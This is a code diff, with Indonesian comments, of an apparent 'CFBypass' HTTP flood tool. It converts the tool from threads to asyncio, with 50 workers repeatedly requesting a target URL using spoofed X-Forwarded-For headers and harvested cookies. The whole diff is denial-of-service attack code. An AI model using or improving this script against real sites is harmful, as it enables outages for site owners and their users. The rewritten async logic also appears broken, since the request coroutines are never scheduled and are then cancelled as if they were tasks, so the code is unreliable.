@@ -1,8 +1,8 @@
-import requests
+import aiohttp
+import asyncio
 import sys
 import random
 import string
-import threading
 import time
 
 # Mendapatkan URL dan waktu dari argumen
@@ -23,12 +23,15 @@ def random_string_generate(length):
     return ''.join(random.choice(characters) for i in range(length))
 
 # Mendapatkan User-Agent dan Cookie dari halaman awal
-response = requests.get(url)
-cookie = response.cookies.get_dict()
-user_agent = response.request.headers.get('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3')
+async def fetch_initial_data():
+    async with aiohttp.ClientSession() as session:
+        async with session.get(url) as response:
+            cookie = response.cookies
+            user_agent = response.request_info.headers.get('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3')
+            return cookie, user_agent
 
 # Fungsi untuk mengirimkan permintaan HTTP
-def send_request():
+async def send_request(session, cookie, user_agent):
     while True:
         try:
             random_string = random_string_generate(10)
@@ -44,28 +47,20 @@ def send_request():
                 'X-Forwarded-For': fake_ip
             }
 
-            requests.get(url, headers=headers)
+            async with session.get(url, headers=headers):
+                pass
         except Exception as e:
             print('Failed to get website data:', e)
 
-# Membuat thread untuk mengirimkan permintaan
-threads = []
-start_time = time.time()
+# Fungsi utama untuk menjalankan semua task
+async def main():
+    cookie, user_agent = await fetch_initial_data()
+    async with aiohttp.ClientSession() as session:
+        tasks = [send_request(session, cookie, user_agent) for _ in range(50)]
+        start_time = time.time()
+        while time.time() - start_time <= time_duration:
+            await asyncio.sleep(1)
+        for task in tasks:
+            task.cancel()
 
-# Jumlah thread yang ingin digunakan (adjust jika diperlukan)
-num_threads = 50
-
-for _ in range(num_threads):
-    thread = threading.Thread(target=send_request)
-    thread.start()
-    threads.append(thread)
-
-# Menunggu hingga waktu habis
-while time.time() - start_time <= time_duration:
-    time.sleep(1)
-
-# Menghentikan semua thread
-for thread in threads:
-    thread.join()
-
-print("CFBypass selesai.")
+asyncio.run(main())
